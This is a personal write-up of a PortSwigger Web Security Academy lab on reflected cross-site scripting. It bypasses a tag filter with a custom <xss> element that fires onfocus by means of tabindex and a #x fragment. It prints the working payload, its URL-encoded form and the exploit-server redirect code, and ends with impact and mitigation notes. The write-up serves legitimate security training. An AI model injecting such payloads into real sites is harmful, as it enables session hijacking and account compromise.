## Lab 15: Reflected XSS into HTML Context with All Tags Blocked Except Custom Ones

### Platform

PortSwigger Web Security Academy

### Difficulty

Practitioner

### Topic

Cross-Site Scripting / Reflected XSS / Custom Tags / WAF Bypass / Event Handler Injection

### Lab Status

Solved

### Objective

The goal of this lab was to exploit a reflected XSS vulnerability where all standard HTML tags were blocked except custom tags, and execute `alert(document.cookie)` automatically.

### Simple Explanation

This lab contained a reflected XSS vulnerability in the search functionality.

The application blocked common HTML tags such as `script`, `img`, `svg`, and other standard tags.

However, the application allowed custom HTML tags.

A custom tag is a non-standard tag such as:

```html
<xss>
```

Because custom tags were allowed, I injected a custom tag with an `onfocus` event handler.

To make the event trigger automatically, I added a `tabindex` attribute to make the custom element focusable, then used a URL fragment `#x` to focus the element when the page loaded.

### Vulnerability Description

The application reflected the search input into the HTML response.

A filtering mechanism blocked most standard HTML tags.

However, the filter allowed custom tags.

The injected custom tag was able to include an event handler attribute.

By using `onfocus`, `tabindex`, and a URL fragment, the payload executed automatically without requiring user interaction.

### Key Concept

When normal HTML tags are blocked, custom tags may still be allowed.

In this lab:

```text
Allowed tag: custom tag <xss>
Event handler: onfocus
Automatic trigger: #x fragment
Required function: alert(document.cookie)
```

The custom element needed to be focusable, so the payload used:

```html
tabindex=1
```

The URL ended with:

```text
#x
```

This caused the browser to focus the injected element with `id=x`, triggering the `onfocus` event.

### Payload Used

The reflected payload was:

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>
```

The URL-encoded payload was:

```text
%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E
```

The final exploit server code was:

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

### Payload Explanation

The payload was:

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>
```

It can be understood as follows:

```html
<xss>
```

Creates a custom HTML tag that bypasses the tag filter.

```html
id=x
```

Gives the custom element an ID so it can be targeted using `#x`.

```html
onfocus=alert(document.cookie)
```

Executes JavaScript when the element receives focus.

```html
tabindex=1
```

Makes the custom element focusable.

```text
#x
```

Focuses the element with ID `x` when the page loads, triggering the `onfocus` event automatically.

### Steps Taken

Opened the exploit server.

Added the following exploit code:

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

Replaced `YOUR-LAB-ID` with the real lab ID.

Stored the exploit.

Delivered the exploit to the victim.

The victim was redirected to the vulnerable search page with the encoded payload.

The page reflected the custom tag into the HTML context.

The `#x` fragment focused the injected element.

The `onfocus` event executed:

```javascript
alert(document.cookie)
```

Successfully solved the lab.

### Result

The exploit executed `alert(document.cookie)` automatically.

This confirmed that the application was vulnerable to reflected XSS using custom tags and event handler injection despite blocking standard HTML tags.

### What I Learned

Blocking common HTML tags is not enough to prevent XSS.

Custom tags can sometimes bypass tag-based filters.

Event handlers can still execute JavaScript on custom elements.

The `tabindex` attribute can make an element focusable.

URL fragments such as `#x` can be used to automatically focus an element with a matching ID.

XSS payloads can be triggered without user interaction by combining browser behavior with event handlers.

### Security Impact

In a real-world application, this vulnerability could allow an attacker to craft a malicious URL that executes JavaScript in a victim's browser.

Because the payload calls `alert(document.cookie)` in the lab, it demonstrates how an attacker could potentially access sensitive browser-side data if cookies are not properly protected.

This could lead to session abuse, account compromise, phishing, or unauthorized actions depending on the application's security controls.

### Mitigation

To prevent this vulnerability, developers should:

Use context-aware output encoding.

Avoid reflecting raw user input into HTML responses.

Do not rely only on blocking known HTML tags.

Block or sanitize custom tags and event handler attributes.

Use a trusted HTML sanitizer when user-generated HTML is required.

Validate input based on expected values.

Set sensitive cookies with the `HttpOnly` flag where possible.

Apply Content Security Policy as an additional defense.

Test filters against custom tags, event handlers, and browser auto-focus behavior.

### Tools Used

PortSwigger Web Security Academy

Exploit Server

Web Browser

Browser Developer Tools
